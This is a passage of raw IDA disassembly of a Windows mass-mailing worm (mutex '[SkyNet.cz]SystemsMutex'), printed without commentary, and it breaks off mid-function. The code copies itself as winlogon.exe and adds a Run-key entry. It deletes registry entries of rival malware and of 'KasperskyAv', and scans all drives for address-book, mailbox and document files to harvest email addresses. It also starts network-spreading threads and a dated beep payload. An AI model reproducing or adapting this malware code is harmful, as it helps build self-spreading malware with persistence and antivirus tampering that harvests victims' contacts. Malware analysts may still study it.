; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4028F4:				; CODE XREF: sub_4028A4+4Aj
		xor	esi, esi
		xor	ebx, ebx

loc_4028F8:				; CODE XREF: sub_4028A4+4Ej
		inc	eax
		mov	[ebp+var_8], eax
		jmp	short loc_402949
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4028FE:				; CODE XREF: sub_4028A4+3Cj
		movsx	eax, byte ptr [eax+edi]
		push	eax		; int
		push	ds:off_4080AC[esi*4] ; char *
		call	_strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_402941
		mov	eax, [ebp+var_8]
		mov	al, [eax+edi]
		cmp	al, 60h
		jle	short loc_402923
		cmp	al, 7Bh
		jl	short loc_402941

loc_402923:				; CODE XREF: sub_4028A4+79j
		cmp	al, 2Fh
		jle	short loc_40292B
		cmp	al, 3Ah
		jl	short loc_402941

loc_40292B:				; CODE XREF: sub_4028A4+81j
		cmp	[ebp+var_1], 1
		jnz	short loc_402934
		inc	esi
		jmp	short loc_40293B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402934:				; CODE XREF: sub_4028A4+8Bj
		inc	[ebp+var_8]
		xor	esi, esi
		xor	ebx, ebx

loc_40293B:				; CODE XREF: sub_4028A4+8Ej
		and	[ebp+var_1], 0
		jmp	short loc_402949
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402941:				; CODE XREF: sub_4028A4+6Fj
					; sub_4028A4+7Dj ...
		inc	[ebp+var_8]
		mov	[ebp+var_1], 1
		inc	ebx

loc_402949:				; CODE XREF: sub_4028A4+58j
					; sub_4028A4+9Bj
		cmp	ebx, 28h
		jle	short loc_402956
		and	[ebp+var_1], 0
		xor	esi, esi
		xor	ebx, ebx

loc_402956:				; CODE XREF: sub_4028A4+A8j
		cmp	esi, 3
		jnz	loc_402A13
		mov	ax, ds:word_417C20
		push	9
		mov	word ptr [ebp+var_34], ax
		pop	ecx
		xor	eax, eax
		lea	edi, [ebp-32h]
		rep stosd
		stosw
		mov	eax, [ebp+var_8]
		push	ebx		; size_t
		sub	eax, ebx
		add	eax, [ebp+arg_0]
		push	eax		; char *
		lea	eax, [ebp+var_34]
		push	eax		; char *
		call	_strncpy
		lea	eax, [ebp+var_34]
		push	eax		; char *
		call	_strlen
		add	esp, 10h
		cmp	eax, 5
		jbe	short loc_402A05
		lea	eax, [ebp+var_34]
		push	eax		; char *
		call	_strlen
		mov	esi, eax
		pop	ecx
		cmp	byte ptr [ebp+esi-35h],	5Dh
		lea	edi, [ebp+esi-35h]
		jnz	short loc_4029C5
		push	5Bh		; int
		push	ds:off_4080B8	; char *
		call	_strchr
		pop	ecx
		test	eax, eax
		pop	ecx
		jnz	short loc_4029C5
		and	[edi], al

loc_4029C5:				; CODE XREF: sub_4028A4+10Aj
					; sub_4028A4+11Dj
		movsx	eax, byte ptr [edi]
		push	eax		; int
		call	_isdigit
		test	eax, eax
		pop	ecx
		jz	short loc_4029E1
		cmp	[ebp+esi+var_37], 2Eh
		jz	short loc_4029FB
		cmp	[ebp+esi+var_38], 2Eh
		jz	short loc_4029FB

loc_4029E1:				; CODE XREF: sub_4028A4+12Dj
		cmp	[ebp+esi+var_36], 2Eh
		jz	short loc_4029FB
		cmp	byte ptr [edi],	5Dh
		jz	short loc_4029FB
		cmp	[ebp+esi+var_37], 2Eh
		jz	short loc_4029FB
		cmp	[ebp+esi+var_38], 2Eh
		jnz	short loc_402A05

loc_4029FB:				; CODE XREF: sub_4028A4+134j
					; sub_4028A4+13Bj ...
		lea	eax, [ebp+var_34]
		push	eax
		call	sub_402821
		pop	ecx

loc_402A05:				; CODE XREF: sub_4028A4+F3j
					; sub_4028A4+155j
		and	[ebp+var_1], 0
		mov	edi, [ebp+arg_0]
		xor	esi, esi
		xor	ebx, ebx
		cmp	esi, 3

loc_402A13:				; CODE XREF: sub_4028A4+B5j
		jl	loc_4028CD

loc_402A19:				; CODE XREF: sub_4028A4+1Fj
					; sub_4028A4+2Fj
		pop	edi
		pop	esi
		xor	eax, eax
		pop	ebx
		leave
		retn
sub_4028A4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_402A20	proc near		; CODE XREF: sub_402A51+13p

arg_0		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, [esp+arg_0]
		push	edi		; char *
		call	_strlen
		pop	ecx
		mov	esi, eax

loc_402A2F:				; CODE XREF: sub_402A20+19j
					; sub_402A20+25j
		dec	esi
		cmp	esi, 0FFFFFFFFh
		jle	short loc_402A4C
		cmp	byte ptr [esi+edi], 2Eh
		jnz	short loc_402A2F
		push	edi		; char *
		call	_strlen
		dec	eax
		pop	ecx
		cmp	esi, eax
		jz	short loc_402A2F
		lea	eax, [esi+edi]
		jmp	short loc_402A4E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402A4C:				; CODE XREF: sub_402A20+13j
		xor	eax, eax

loc_402A4E:				; CODE XREF: sub_402A20+2Aj
		pop	edi
		pop	esi
		retn
sub_402A20	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402A51	proc near		; CODE XREF: sub_402C58:loc_402D44p

sz		= byte ptr -100Ch
lOffset		= dword	ptr -8
var_4		= dword	ptr -4
hFile		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, 100Ch
		call	__alloca_probe
		push	ebx
		push	esi
		push	edi
		push	[ebp+hFile]
		call	sub_402A20
		mov	ebx, eax
		xor	esi, esi
		cmp	ebx, esi
		pop	ecx
		mov	[ebp+var_4], ebx
		jz	loc_402C53
		push	ebx		; char *
		call	_strlen
		pop	ecx
		push	eax		; cchLength
		push	ebx		; lpsz
		call	ds:CharLowerBuffA
		mov	[ebp+lOffset], esi
		mov	edi, 0FFh

loc_402A90:				; CODE XREF: sub_402A51+58j
		push	ebx		; char *
		push	ds:off_4080B8[esi*4] ; char *
		call	_strstr
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402AA5
		mov	esi, edi

loc_402AA5:				; CODE XREF: sub_402A51+50j
		inc	esi
		cmp	esi, 15h
		jl	short loc_402A90
		cmp	esi, edi
		jl	loc_402C53
		push	0		; iReadWrite
		push	[ebp+hFile]	; lpPathName
		call	ds:_lopen
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+hFile], eax
		jz	loc_402C53
		mov	ebx, offset word_417C20
		lea	eax, [ebp+sz]
		push	ebx		; char *
		push	eax		; char *
		call	_strcpy
		mov	esi, ds:_lread
		pop	ecx
		pop	ecx
		mov	edi, 1000h
		lea	eax, [ebp+sz]
		push	edi		; uBytes
		push	eax		; lpBuffer
		push	[ebp+hFile]	; hFile

loc_402AF4:				; CODE XREF: sub_402A51+1F4j
		call	esi ; _lread
		and	[ebp+eax+sz], 0
		test	eax, eax
		jle	loc_402C4A
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; cchLength
		lea	eax, [ebp+sz]
		push	eax		; lpsz
		call	ds:CharLowerBuffA
		push	offset a_sht	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402BEF
		push	offset a_tbb	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402BEF
		push	offset a_adb	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402BEF
		push	offset a_wab	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402BEF
		push	offset a_msg	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402BD4
		push	offset a_oft	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402BD4
		push	offset a_doc	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402BD4
		push	offset a_dbx	; char *
		push	[ebp+var_4]	; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_402BD4
		lea	eax, [ebp+sz]
		push	eax
		call	sub_4028A4

loc_402BD1:				; CODE XREF: sub_402A51+19Cj
		pop	ecx
		jmp	short loc_402C16
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402BD4:				; CODE XREF: sub_402A51+139j
					; sub_402A51+14Cj ...
		lea	eax, [ebp+sz]
		push	eax
		call	sub_40278E
		lea	eax, [ebp+sz]
		push	eax
		call	sub_4028A4
		pop	ecx
		jmp	short loc_402BD1
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402BEF:				; CODE XREF: sub_402A51+E1j
					; sub_402A51+F8j ...
		lea	eax, [ebp+sz]
		push	eax
		call	sub_40278E
		lea	eax, [ebp+sz]
		push	eax
		call	sub_4027B4
		lea	eax, [ebp+sz]
		push	eax
		call	sub_4028A4
		add	esp, 0Ch

loc_402C16:				; CODE XREF: sub_402A51+181j
		push	0		; iOrigin
		push	[ebp+lOffset]	; lOffset
		push	[ebp+hFile]	; hFile
		call	ds:_llseek
		add	[ebp+lOffset], 800h
		lea	eax, [ebp+sz]
		push	ebx		; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		lea	eax, [ebp+sz]
		pop	ecx
		push	edi
		push	eax
		push	[ebp+hFile]
		jmp	loc_402AF4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402C4A:				; CODE XREF: sub_402A51+AFj
		push	[ebp+hFile]	; hFile
		call	ds:_lclose

loc_402C53:				; CODE XREF: sub_402A51+22j
					; sub_402A51+5Cj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_402A51	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402C58	proc near		; CODE XREF: sub_402C58+E5p
					; StartAddress+24p

sz		= byte ptr -540h
FindFileData	= byte ptr -140h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 540h
		push	esi
		lea	eax, [ebp+sz]
		push	[ebp+arg_0]	; char *
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+sz]
		push	offset a__1	; char *
		push	eax		; char *
		call	_strcat
		add	esp, 10h
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		lea	eax, [ebp+sz]
		push	eax		; lpFileName
		call	ds:FindFirstFileA
		mov	esi, eax
		test	esi, esi
		jz	loc_402D73
		cmp	esi, 0FFFFFFFFh
		jz	loc_402D73

loc_402CAC:				; CODE XREF: sub_402C58+10Ej
		cmp	byte ptr [ebp-113h], 0
		jnz	short loc_402CC2
		cmp	byte ptr [ebp-114h], 2Eh
		jz	loc_402D56

loc_402CC2:				; CODE XREF: sub_402C58+5Bj
		cmp	byte ptr [ebp-112h], 0
		jnz	short loc_402CDD
		cmp	byte ptr [ebp-114h], 2Eh
		jnz	short loc_402CDD
		cmp	byte ptr [ebp-113h], 2Eh
		jz	short loc_402D56

loc_402CDD:				; CODE XREF: sub_402C58+71j
					; sub_402C58+7Aj
		push	[ebp+arg_0]	; char *
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+sz]
		push	offset asc_40AB3C ; char *
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp-114h]
		push	eax		; char *
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strcat
		lea	eax, [ebp+sz]
		push	eax		; char *
		call	_strlen
		add	esp, 1Ch
		push	eax		; cchLength
		lea	eax, [ebp+sz]
		push	eax		; lpsz
		call	ds:CharLowerBuffA
		test	[ebp+FindFileData], 10h
		lea	eax, [ebp+sz]
		push	eax
		jz	short loc_402D44
		call	sub_402C58
		jmp	short loc_402D49
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402D44:				; CODE XREF: sub_402C58+E3j
		call	sub_402A51

loc_402D49:				; CODE XREF: sub_402C58+EAj
		cmp	ds:dword_417C18, 27FFh
		pop	ecx
		jg	short loc_402D6C

loc_402D56:				; CODE XREF: sub_402C58+64j
					; sub_402C58+83j
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		push	esi		; hFindFile
		call	ds:FindNextFileA
		test	eax, eax
		jnz	loc_402CAC

loc_402D6C:				; CODE XREF: sub_402C58+FCj
		push	esi		; hFindFile
		call	ds:FindClose

loc_402D73:				; CODE XREF: sub_402C58+45j
					; sub_402C58+4Ej
		pop	esi
		leave
		retn
sub_402C58	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


; DWORD	__stdcall StartAddress(LPVOID)
StartAddress	proc near		; DATA XREF: WinMain(x,x,x,x)+A7o
		push	esi
		push	0FFFFFFFFh	; nPriority
		call	ds:GetCurrentThread
		push	eax		; hThread
		call	ds:SetThreadPriority
		mov	esi, offset off_408870

loc_402D8B:				; CODE XREF: StartAddress+33j
		push	dword ptr [esi]	; lpRootPathName
		call	ds:GetDriveTypeA
		cmp	eax, 5
		jz	short loc_402DA0
		push	dword ptr [esi]
		call	sub_402C58
		pop	ecx

loc_402DA0:				; CODE XREF: StartAddress+20j
		add	esi, 4
		cmp	esi, offset dword_4088D0
		jl	short loc_402D8B
		xor	eax, eax
		pop	esi
		retn	4
StartAddress	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402DB1	proc near		; CODE XREF: sub_402DDF+E2p
					; sub_402DDF+EFp ...

hKey		= dword	ptr  8
phkResult	= dword	ptr  0Ch
lpValueName	= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		lea	eax, [ebp+phkResult]
		push	eax		; phkResult
		push	[ebp+phkResult]	; lpSubKey
		push	[ebp+hKey]	; hKey
		call	ds:RegOpenKeyA
		test	eax, eax
		jnz	short loc_402DDD
		push	[ebp+lpValueName] ; lpValueName
		push	[ebp+phkResult]	; hKey
		call	ds:RegDeleteValueA
		push	[ebp+phkResult]	; hKey
		call	ds:RegCloseKey

loc_402DDD:				; CODE XREF: sub_402DB1+15j
		pop	ebp
		retn
sub_402DB1	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402DDF	proc near		; CODE XREF: WinMain(x,x,x,x)+62p

ExistingFileName= byte ptr -824h
var_425		= byte ptr -425h
Data		= byte ptr -424h
hKey		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 824h
		push	ebx
		push	esi
		mov	esi, 400h
		push	edi
		lea	eax, [ebp+ExistingFileName]
		push	esi		; nSize
		xor	ebx, ebx
		push	eax		; lpFilename
		push	ebx		; hModule
		call	ds:GetModuleFileNameA
		lea	eax, [ebp+Data]
		push	esi		; uSize
		push	eax		; lpBuffer
		call	ds:GetWindowsDirectoryA
		lea	eax, [ebp+Data]
		push	eax		; char *
		call	_strlen
		cmp	[ebp+eax+var_425], 5Ch
		pop	ecx
		jz	short loc_402E39
		lea	eax, [ebp+Data]
		push	offset asc_40AB3C ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_402E39:				; CODE XREF: sub_402DDF+45j
		lea	eax, [ebp+Data]
		push	offset aWinlogon_exe ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+Data]
		pop	ecx
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		lea	eax, [ebp+Data]
		push	offset aStealth	; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+hKey]
		pop	ecx
		mov	esi, offset SubKey ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
		push	eax		; phkResult
		mov	edi, 80000002h
		push	esi		; lpSubKey
		push	edi		; hKey
		call	ds:RegOpenKeyA
		lea	eax, [ebp+Data]
		push	eax		; char *
		call	_strlen
		pop	ecx
		push	eax		; cbData
		lea	eax, [ebp+Data]
		push	eax		; lpData
		push	1		; dwType
		push	ebx		; Reserved
		push	offset ValueName ; lpValueName
		push	[ebp+hKey]	; hKey
		call	ds:RegSetValueExA
		push	[ebp+hKey]	; hKey
		call	ds:RegCloseKey
		mov	ebx, offset aTaskmon ; "Taskmon"
		push	ebx
		push	esi
		push	edi
		call	sub_402DB1
		push	ebx
		mov	ebx, 80000001h
		push	esi
		push	ebx
		call	sub_402DB1
		push	offset aExplorer ; "Explorer"
		push	esi
		push	edi
		call	sub_402DB1
		push	offset aExplorer ; "Explorer"
		push	esi
		push	ebx
		call	sub_402DB1
		add	esp, 30h
		push	offset aClsidE6fb5e20D ; lpSubKey
		push	80000000h	; hKey
		call	ds:RegDeleteKeyA
		push	offset aKasperskyav ; "KasperskyAv"
		push	esi
		push	edi
		call	sub_402DB1
		push	offset aKasperskyav ; "KasperskyAv"
		push	esi
		push	ebx
		call	sub_402DB1
		push	offset aSystem_	; "system."
		push	esi
		push	edi
		call	sub_402DB1
		push	offset aSystem_	; "system."
		push	offset aSoftwareMicr_0 ; "SOFTWARE\\Microsoft\\Windows\\CurrentVersi"...
		push	edi
		call	sub_402DB1
		push	offset aMsgsvr32 ; "msgsvr32"
		push	esi
		push	edi
		call	sub_402DB1
		push	offset aDeleteMe ; "DELETE ME"
		push	esi
		push	edi
		call	sub_402DB1
		add	esp, 48h
		push	offset aD3dupdate_exe ;	"d3dupdate.exe"
		push	esi
		push	ebx
		call	sub_402DB1
		push	offset aAu_exe	; "au.exe"
		push	esi
		push	ebx
		call	sub_402DB1
		push	offset aService	; "service"
		push	esi
		push	edi
		call	sub_402DB1
		push	offset aOle	; "OLE"
		push	esi
		push	ebx
		call	sub_402DB1
		push	offset aSentry	; "Sentry"
		push	esi
		push	edi
		call	sub_402DB1
		add	esp, 3Ch
		push	offset aSoftwareMicr_1 ; lpSubKey
		push	ebx		; hKey
		call	ds:RegDeleteKeyA
		push	offset aSystemCurrentc ; lpSubKey
		push	edi		; hKey
		call	ds:RegDeleteKeyA
		push	offset aWindowsService ; "Windows Services Host"
		push	esi
		push	ebx
		call	sub_402DB1
		push	offset aWindowsService ; "Windows Services Host"
		push	esi
		push	edi
		call	sub_402DB1
		add	esp, 18h
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_402DDF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; DWORD	__stdcall sub_402FC4(LPVOID)
sub_402FC4	proc near		; DATA XREF: WinMain(x,x,x,x)+B6o

SystemTime	= _SYSTEMTIME ptr -10h

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	0FFFFFFFFh	; nPriority
		call	ds:GetCurrentThread
		push	eax		; hThread
		call	ds:SetThreadPriority

loc_402FD9:				; CODE XREF: sub_402FC4+72j
		lea	eax, [ebp+SystemTime]
		push	eax		; lpSystemTime
		call	ds:GetLocalTime
		cmp	[ebp+SystemTime.wDay], 2
		jnz	short loc_40302E
		cmp	[ebp+SystemTime.wMonth], 3
		jnz	short loc_40302E
		cmp	[ebp+SystemTime.wYear],	7D4h
		jnz	short loc_40302E
		cmp	[ebp+SystemTime.wHour],	6
		jz	short loc_40300E
		cmp	[ebp+SystemTime.wHour],	7
		jz	short loc_40300E
		cmp	[ebp+SystemTime.wHour],	8
		jnz	short loc_40302E

loc_40300E:				; CODE XREF: sub_402FC4+3Aj
					; sub_402FC4+41j
		call	sub_401D73
		push	32h
		cdq
		pop	ecx
		idiv	ecx
		push	edx		; dwDuration
		call	sub_401D73
		cdq
		mov	ecx, 0BB8h
		idiv	ecx
		push	edx		; dwFreq
		call	ds:Beep

loc_40302E:				; CODE XREF: sub_402FC4+24j
					; sub_402FC4+2Bj ...
		push	32h		; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_402FD9
sub_402FC4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


; DWORD	__stdcall sub_403038(LPVOID)
sub_403038	proc near		; DATA XREF: WinMain(x,x,x,x)+C2o

var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		push	ecx
		push	ecx
		push	ebx
		push	ebp
		mov	ebp, ds:InternetGetConnectedState
		push	esi
		push	edi
		mov	edi, ds:Sleep

loc_40304A:				; CODE XREF: sub_403038+28j
					; sub_403038+32j ...
		push	32h		; dwMilliseconds
		call	edi ; Sleep
		and	[esp+18h+var_4], 0
		lea	eax, [esp+18h+var_4]
		push	0
		push	eax
		call	ebp ; InternetGetConnectedState
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_40304A
		xor	esi, esi
		cmp	ds:dword_417C18, esi
		jle	short loc_40304A
		mov	[esp+20h+var_10], offset dword_40DB10

loc_403074:				; CODE XREF: sub_403038+79j
		cmp	ebx, 1
		jnz	short loc_40304A
		cmp	byte ptr ds:dword_40B310[esi], 0
		lea	ebx, dword_40B310[esi]
		jnz	short loc_403096
		mov	eax, [esp+20h+var_10]
		push	dword ptr [eax]
		call	sub_401E62
		mov	byte ptr [ebx],	1

loc_403096:				; CODE XREF: sub_403038+4Ej
		lea	eax, [esp+20h+var_C]
		push	0
		push	eax
		call	ebp ; InternetGetConnectedState
		push	32h		; dwMilliseconds
		mov	ebx, eax
		call	edi ; Sleep
		inc	esi
		add	[esp+28h+var_18], 4
		cmp	esi, ds:dword_417C18
		jl	short loc_403074
		jmp	short loc_40304A
sub_403038	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

; __stdcall WinMain(x,x,x,x)
_WinMain@16	proc near		; CODE XREF: start+C9p

var_1B0		= dword	ptr -1B0h
WSAData		= WSAData ptr -1A8h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
ThreadId	= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 1A8h
		push	esi
		call	ds:GetTickCount
		push	eax		; lpName
		call	sub_401D91
		xor	esi, esi
		mov	[esp+1B0h+var_1B0], offset aSkynet_czSyste ; "[SkyNet.cz]SystemsMutex"
		push	esi		; bInitialOwner
		push	esi		; lpMutexAttributes
		call	ds:CreateMutexA
		mov	ds:dword_417C14, eax
		call	ds:GetLastError
		cmp	eax, 0B7h
		jnz	short loc_4030F5
		xor	eax, eax
		pop	esi
		leave
		retn	10h
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4030F5:				; CODE XREF: WinMain(x,x,x,x)+37j
		push	ebx
		lea	eax, [ebp+WSAData]
		push	edi
		push	eax		; lpWSAData
		push	101h		; wVersionRequested
		call	ds:WSAStartup
		mov	ecx, 0A00h
		xor	eax, eax
		mov	edi, offset dword_40B310
		rep stosd
		call	sub_402DDF
		mov	edi, offset aSkoorpio@yahoo ; "skoorpio@yahoo.com"
		mov	ds:dword_417C18, esi
		push	edi		; char *
		call	_strlen
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ecx, ds:dword_417C18
		push	edi		; char *
		push	eax		; char *
		mov	ds:dword_40DB10[ecx*4],	eax
		call	_strcpy
		add	esp, 10h
		mov	edi, ds:CreateThread
		inc	ds:dword_417C18
		lea	eax, [ebp+ThreadId]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset StartAddress ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		lea	eax, [ebp+var_18]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	offset sub_402FC4 ; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		lea	eax, [ebp+var_10]
		mov	ebx, offset sub_403038
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebx		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		lea	eax, [ebp+var_4]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebx		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		lea	eax, [ebp+var_C]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebx		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		lea	eax, [ebp+var_14]
		push	eax		; lpThreadId
		push	esi		; dwCreationFlags
		push	esi		; lpParameter
		push	ebx		; lpStartAddress
		push	esi		; dwStackSize
		push	esi		; lpThreadAttributes
		call	edi ; CreateThread
		pop	edi
		pop	ebx

loc_4031A7:				; CODE XREF: WinMain(x,x,x,x)+FDj
		push	3E8h		; dwMilliseconds
		call	ds:Sleep
		jmp	short loc_4031A7
_WinMain@16	endp

; [00000006 BYTES: COLLAPSED FUNCTION GetNetworkParams.	PRESS KEYPAD "+" TO EXPAND]
		align 10h
; [00000058 BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD "+"	TO EXPAND]
; [0000000E BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
		align 10h

; void *__cdecl	memcpy(void *,const void *,size_t)
_memcpy:				; CODE XREF: sub_4012AF+56p
					; sub_4012AF+5Ep ...
		push	ebp
